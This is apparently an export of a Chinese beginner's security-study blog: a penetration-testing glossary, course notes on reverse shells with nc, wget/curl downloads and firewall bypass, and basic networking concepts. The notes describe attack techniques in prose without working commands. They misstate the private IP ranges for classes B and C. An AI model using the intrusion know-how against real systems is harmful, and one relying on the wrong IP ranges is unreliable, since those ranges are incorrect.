Infrastructure虚拟移动设施，与PC云桌面类似）技术，为员工提供一个独立的移动设备安全虚拟手机，业务应用和数据仅在服务端运行和存储，个人终端上仅做加密流媒体呈现和触控，从而有效保障企业数据的安全性。\n风控也称大数据风控，是指利用大数据分析的方法判断业务可能存在的安全风险，目前该技术主要用于金融信贷领域，防止坏账的发生。\n渗透测试为了证明网络防御按照预期计划正常运行而提供的一种机制，通常会邀请专业公司的攻击团队，按照一定的规则攻击既定目标，从而找出其中存在的漏洞或者其他安全隐患，并出具测试报告和整改建议。其目的在于不断提升系统的安全性。\n安全众测借助众多白帽子的力量，针对目标系统在规定时间内进行漏洞悬赏测试。您在收到有效的漏洞后，按漏洞风险等级给予白帽子一定的奖励。通常情况下是按漏洞付费，性价比较高。同时，不同白帽子的技能研究方向可能不同，在进行测试的时候更为全面。\n内生安全由奇安信集团董事长齐向东在2019北京网络安全大会上首次提出，指的是不断从信息化系统内生长出的安全能力，能伴随业务的增长而持续提升，持续保证业务安全。内生安全有三个特性，即依靠信息化系统与安全系统的聚合、业务数据与安全数据的聚合以及IT人才和安全人才的聚合，从信息化系统的内部，不断长出自适应、自主和自成长的安全能力。\n内生安全框架为推动内生安全的落地，奇安信推出了内生安全框架。该框架从顶层视角出发，支撑各行业的建设模式从“局部整改外挂式”，走向“深度融合体系化”；从工程实现的角度，将安全需求分步实施，逐步建成面向未来的安全体系；内生安全框架能够输出实战化、体系化、常态化的安全能力，构建出动态防御、主动防御、纵深防御、精准防护、整体防控、联防联控的网络安全防御体系。内生安全框架包含了总结出了29个安全区域场景和 79类安全组件。\nPPDR英文全称为Policy Protection Detection Response，翻译为策略、防护、检测和响应。主要以安全策略为核心，通过一致性检查、流量统计、异常分析、模式匹配以及基于应用、目标、主机、网络的入侵检查等方法进行安全漏洞检测。\nCARTA全称为Continuous Adaptive Risk and Trust Assessment，即持续自适应风险与信任评估旨在通过动态智能分析来评估用户行为，放弃追求完美的安全，不能要求零风险，不要求100%信任，寻求一种0和1之间的风险与信任的平衡。CARTA战略是一个庞大的体系，其包括大数据、AI、机器学*、自动化、行为分析、威胁检测、安全防护、安全评估等方面。\nSASE全称为Secure Access Service Edge，即安全访问服务边缘，Gartner将其定义为一种基于实体的身份、实时上下文、企业安全&#x2F;合规策略，以及在整个会话中持续评估风险&#x2F;信任的服务。实体的身份可与人员、人员组（分支办公室）、设备、应用、服务、物联网系统或边缘计算场地相关联。\nSDL全称为Security Development Lifecycle，翻译为安全开发生命周期，是一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程，最早由微软提出。\nDevSecOps全称为Development Security Operations，可翻译为安全开发与运维。它强调在DevOps计划刚启动时就要邀请安全团队来确保信息的安全性，制定自动安全防护计划，并贯穿始终，实现持续 IT 防护。\n代码审计顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。\nNTLM验证NTLM(NT LAN Manager)是微软公司开发的一种身份验证机制，从NT4开始就一直使用，主要用于本地的帐号管理。\nMTTD平均检测时间。\nMTTR平均响应时间。\nCVE全称Common Vulnerabilities and Exposures，由于安全机构Mitre维护一个国际通用的漏洞唯一编号方案，已经被安全业界广泛接受的标准。\n软件加壳“壳”是一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。经过加壳的软件在跟踪时已无法看到其真实的十六进制代码，因此可以起到保护软件的目的。\nCNVD国家信息安全漏洞共享平台，由国家计算机应急响应中心CNCERT维护，主要负责统一收集、管理国内的漏洞信息，其发布的漏洞编号前缀也为CNVD。\n数据脱敏数据脱敏是指对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护，主要用于数据的共享和交易等涉及大范围数据流动的场景。\nGDPR《通用数据保护条例》（General Data Protection Regulation，简称GDPR）为欧洲联盟的条例，前身是欧盟在1995年制定的《计算机数据保护法》。\nCCPA美国加利福尼亚州消费者隐私保护法案。\nSRC即Security Response Center，中文名为安全应急响应中心，主要职责为挖掘并公开收集机构存在的漏洞和其他安全隐患。\nCISO有时也被叫做CSO，即首席信息安全官，为机构的主要安全负责人。\nIPC管道为了更好地控制和处理不同进程之间的通信和数据交换，系统会通过一个特殊的连接管道来调度整个进程。\nSYN包TCP连接的第一个包，非常小的一种数据包。SYN攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。\nIPC$是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。\nshell指的是一种命令指行环境，是系统与用户的交换方式界面。简单来说，就是系统与用户“沟通”的环境。我们平时常用到的DOS，就是一个shell。（Windows2000是cmd.exe）\nARP地址解析协议(Address Resolution Protocol)此协议将网络地址映射到硬件地址。\n","slug":"渗透测试常用术语总结","date":"2024-01-24T04:13:03.000Z","categories_index":"","tags_index":"网络安全,小迪安全,基础入门,渗透测试,常用术语","author_index":"Myprefer"},{"id":"fce12428790cc03c0af9eadde9ff43b2","title":"小迪安全 P1","content":"1. 渗透测试常用专有名词\nPOC: Proof of Concept, 概念验证, 指一段漏洞验证代码\nEXP: Exploit. 利用, 指利用系统漏洞进行攻击\nPayload: 中文 ‘ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令\nShellcode: 漏洞利用后将权限移交的代码\nWebshell: 针对web网站的后门\n跳板: 中介\n黑白盒测试: 未知&#x2F;已知\n社会工程学: 针对人的弱点攻击\n撞库: (社工手段)收集用户信息, 统合拆解, 猜测密码\nATT&amp;CK: MITRE ATT&amp;CK®\n一些专业术语总结:渗透测试常用术语总结 | Myprefer’s Blog\n\n\n2.\n常用命令: 【3】web安全入门篇-渗透测试中常用的命令_web安全入门篇 渗透测试中常用的命令-CSDN博客\n\n权限:\n\n命令whoami查看 “我是谁?”\n用户隶属于用户组, 用户组权限优先, 拒绝权限优先\n最高权限: system\n\n\n防火墙:\n\n个人自带防火墙: 允许入站出站\n可以在属性查看防火墙规则\n\n\n\n\n3. 案例\n文件上传下载:\n目的:\n解决无图形化\n解决数据传输\n\n\n文件下载命令: (linux自带)wget, curl(后加下载url)\n命令生成:[~]#棱角 ::Edge.Forum* (ywhack.com)\n\n\n反弹shell命令\n目的: \n解决数据回显, 交互式问答(通俗点: 看命令有没有执行成功)\n解决数据通信\n\n\nnc命令: 【Linux】之nc命令（连接与扫描指定端口、监测服务端口的使用情况）解析、详解实例、邮件告警_nc监听端口-CSDN博客\n正向连接:攻击者-&gt;连接-&gt;目标\n用途: 绕过网络防火墙\n\n\n反向连接: 目标-&gt;主动连接-&gt;攻击者\n用途: 绕过目标系统防火墙\n\n\n在反弹 shell 的上下文中，攻击者通常会在目标系统上部署一个后门程序，该程序负责建立反向连接。攻击者在自己的系统上运行一个监听程序，等待目标系统发起连接，一旦连接建立，攻击者就可以通过这个反向连接与目标系统进行交互，执行命令等操作。\n\n\n用fofa 拿下同行Pikachu服务器\nfofa: FOFA网络空间测绘系统\n\n\n\n课程计划\n\n\n","slug":"小迪安全-P1","date":"2024-01-24T03:42:56.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,基础入门","author_index":"Myprefer"},{"id":"931cb9b0b0328ab44d5960fb6d8e6b9f","title":"第一周课程-基础概念","content":"1. Internet\n发展阶段:\n\n静态页面时期:\n\n仅浏览网页\n\n引入多媒体技术\n\n\n\n\n\n\n\n\n\n多媒体技术就是通过计算机对各种信息(语言文字 、数据、音频、视频等)进行存储和管理，使用户能够通过多种感官跟计算机进行实时信息交流的技术\n\n\n\nCGI阶段\n\n\n\n\n\n\n\n\n\nCGI: Common Gateway Interface(通用网关接口), 是WWW技术中最重要的技术之一, 是外部应用程序(即CGI程序)与WEB服务器之间的接口标准, 负责在CGI程序和Web服务器之间传递信息\n\n云服务时期\n\nWeb技术趋于复杂, 各种技术开始运用, 增加了Web开发运维的难度\n云服务发展, 部署环境容器化, 功能拆分\n\n\n\n\n\n2. 网络安全\nWeb安全（Web Security）\n\n定义: 保护网络基础设施, 信息系统, 用户数据防止非法访问, 窃取和破坏的措施(or: 专注于保护互联网上的Web应用程序和网站的安全性)\n\n\n\n\n\n\n\n\n\nWEB，一种分布式图形信息系统。是建立在Internet上的一种网络服务，为浏览者在Internet上查找和浏览信息提供了图形化的、易于访问的直观界面\n\n\n\n\n3. 专业术语\nIP地址（Internet Protocol Address，互联网协议地址）\n\n在互联网上唯一标识和定位计算机&#x2F;设备的数字地址, 通常是IPv4(32位, 如192.168.5.130)或IPv6(128位, 如fe80::fe44:e504:6d2a:8e01)\n\nIPv4地址的分类\n\nA类地址: 1.0.0.0 ~ 126.255.255.255, 用于大型网络，支持大量主机\nB类地址: 128.0.0.0 ~ 191.255.255.255, 于中等规模的网络\nC类地址: 192.0.0.0 ~ 223.255.255.255, 用于小型网络\n\n\n保留私有IP(内网)分类\n\nA类: 10.0.0.0 ~ 10.255.255.255\nB类: 10.0.0.0 ~ 10.255.255.255\nC类: 10.0.0.0 ~ 10.255.255.255\n\n\n\n\n\n\n\n\n\n\n\n这些私有IP地址通常用于内部网络，例如家庭网络、企业内部网络或组织内部网络\n\n设备在这些私有地址范围内通信时，其流量不会直接在公共互联网上传输，而是通过网络地址转换（NAT）等技术，将私有IP地址映射到公共IP地址以便于与互联网通信，提高通信的安全性，助于缓解IPv4地址枯竭的问题\n\n\n\n\n\nDNS(Domain Name System, 域名系统):\n\n作用:将人类可读的域名映射到IP地址\n\n\n\nURL(Uniform Resource Locator, 统一资源定位符)\n\n用于指定资源的位置和访问方式\n格式: 协议:&#x2F;&#x2F;地址:端口&#x2F;路径&#x2F;…..\n\n\n安全基础-基本概念\n\n黑客: 研究突破计算机安全系统的人员\n黑帽黑客: (非法)入侵他人的安全系统\n白帽黑客: (合法)调试分析安全系统\n\n\n渗透测试: (合法)授权的安全评估方法\n模拟潜在攻击者的行为, 测试安全性\n作用: 发现和修复潜在安全漏洞\n\n\n攻防演练(护网行动):\n各单位, 企业模拟真实情境, 对网络安全系统进行攻击测试和防御\n红队: 模拟攻击方, 在合法, 授权下进行攻击\n蓝队: 复制防御和维护网络安全, 与红队形成对抗\n\n\n\n\n网络安全工具\n\nIDS(Intrusion Detection System, 入侵检测系统)\nIPS(Intrusion-prevention system, 入侵防御系统)\nVPN(Virtual Private Network, 虚拟专用网络):\n建立加密通信通道, 使数据传输更加安全\n可为企业提供安全的远程访问, 让远程用户连接访问企业内网\n允许用户模拟位于其他地理位置, 以绕过地理限制\n\n\n防火墙(Firewall): 一种网络安全设备或软件, 用于监控计算机网络中的数据流量，以防止未经授权的访问、攻击或恶意活动, 是网络安全的第一道防线\n蜜罐(Honeypot):是一种安全机制, 用于诱导攻击, 以便监测、分析和学习攻击行为\n补丁(Patch):修复安全漏洞等问题的解决方案\n\n\n加密技术\n\n加密 解密:\n\n加密算法: \n\n对称加密:\n\n非对称加密:\n\n\n\n\n\n\n\n安全防护策略\n\n身份认证(Authentication): 验证用户提供的身份信息\n授权(Authorization):\n\n\n攻击技术\n\n恶意软件*Malware):常见的形式有:病毒（Viruses） 蠕虫（Worms）木马（Trojan Horse）间谍软件（Spyware）广告软件（Adware）\n钓鱼攻击:(Phshing Attack) :通过欺骗手段获取用户敏感信息\n攻击者通常伪装成可信赖实体(比如xx官方网站)，诱使用户提供个人信息\n\n\n后门(Backdoor): 通过绕过正常授权机制而偷偷进入计算机系统或网络的手段\n病毒: 感染计算机系统并传播自身, 可以对生产环境造成大范围破坏\n漏洞: 软件硬件或系统存在的安全缺陷或错误, 可能被攻击者利用\n社会工程(Social Engineering): 通过心理学手段, 诱导人们透露敏感信息(很多电信诈骗就是靠的这个)\n\n\n\n","slug":"第一周课程-基础概念","date":"2024-01-23T13:58:46.000Z","categories_index":"","tags_index":"网络安全,学习日志,视频会议","author_index":"Myprefer"}]